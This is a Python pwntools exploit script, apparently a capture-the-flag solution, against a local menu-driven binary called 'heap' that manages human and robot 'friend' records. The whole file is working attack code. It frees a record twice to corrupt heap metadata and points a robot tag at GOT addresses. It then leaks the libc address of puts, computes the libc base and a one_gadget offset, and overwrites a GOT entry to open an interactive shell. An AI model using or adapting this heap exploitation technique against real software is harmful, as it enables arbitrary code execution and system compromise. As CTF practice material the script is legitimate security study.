from pwn import *
context.log_level = 'debug'
context.arch='amd64'

b = ELF("./heap")
#libc = ELF("./libc-2.27.so")
libc = ELF("./mylibc.so")

def add_human(p, name, age):
    p.sendlineafter("> ", "1")
    p.sendlineafter("flesh?\n", "1")
    p.sendlineafter("name?\n", name)
    p.sendlineafter("age?\n", str(age))

def add_robot(p, tag, age):
    p.sendlineafter("> ", "1")
    p.sendlineafter("flesh?\n", "0")
    p.sendlineafter("tag?\n", str(tag))
    p.sendlineafter("age?\n", str(age))

def remove_friend(p, index):
    p.sendlineafter("> ", "2")
    p.sendlineafter("remove?\n", str(index))

def display(p, index):
    p.sendlineafter("> ", "3")
    p.sendlineafter("at?\n", str(index))

def edit_human(p, index, name, age):
    p.sendlineafter("> ", "4")
    p.sendlineafter("edit?\n", str(index))
    p.sendlineafter("name?\n", name)
    p.sendlineafter("age?\n", str(age))

def edit_robot(p, index, newid, age):
    p.sendlineafter("> ", "4")
    p.sendlineafter("edit?\n", str(index))
    p.sendlineafter("barcode?\n", str(newid))
    p.sendlineafter("age?\n", str(age))

def main():
    #p = process("./heap", env={"LD_PRELOAD": "./libc-2.27.so"})
    p = process("./heap")
    #p = gdb.debug("./heap", "b display", env={"LD_PRELOAD": "./libc-2.27.so"})
    #p = gdb.debug("./heap", "")
    #gdb.attach(p, "b system")

    add_human(p, "A"*32, 20)
    add_human(p, "B"*32, 20)
    remove_friend(p, 1)
    remove_friend(p, 1)

    add_robot(p, 0x602020, 20)
    display(p, 1)
    leak = p.recvline().strip().split(" ")[3]
    puts_libc = u64(leak.ljust(8, "\x00"))
    print("puts_libc: 0x{:x}".format(puts_libc))

    libc_base = puts_libc - libc.symbols['puts']

    print("Got libc base {:x}".format(libc_base))
    #oneshot = libc_base + 0x4f2c5
    #oneshot = libc_base + 0x4f322
    oneshot = libc_base + 0x10a38c #works locally

    #oneshot = libc_base + 0x4f365
    #oneshot = libc_base + 0x4f3c2
    #oneshot = libc_base + 0x10a45c

    #system = libc_base + libc.symbols['system']

    remove_friend(p, 4)

    add_robot(p, 0x602048, 20)
    #display(p, 4)

    #print("Calculated system {:x}".format(system))
    print("Calculated oneshot {:x}".format(oneshot))
    #edit_human(p, 1, p64(system), 20)
    edit_human(p, 1, p64(oneshot), 20)

    p.sendlineafter("> ", "4")
    p.sendlineafter("edit?\n", "a")


    p.interactive()

main()